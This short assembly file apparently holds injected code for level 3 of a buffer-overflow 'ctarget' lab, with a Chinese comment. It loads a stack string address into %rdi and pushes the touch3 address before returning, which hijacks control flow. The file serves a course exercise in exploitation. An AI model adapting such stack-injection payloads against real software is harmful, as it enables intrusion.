.text
ctargetL3:
    movq    $0x5561dca8, %rdi      # 字符串首地址 = buf+48,在返回地址槽之上
    pushq   $0x4018fa              # touch3
    ret
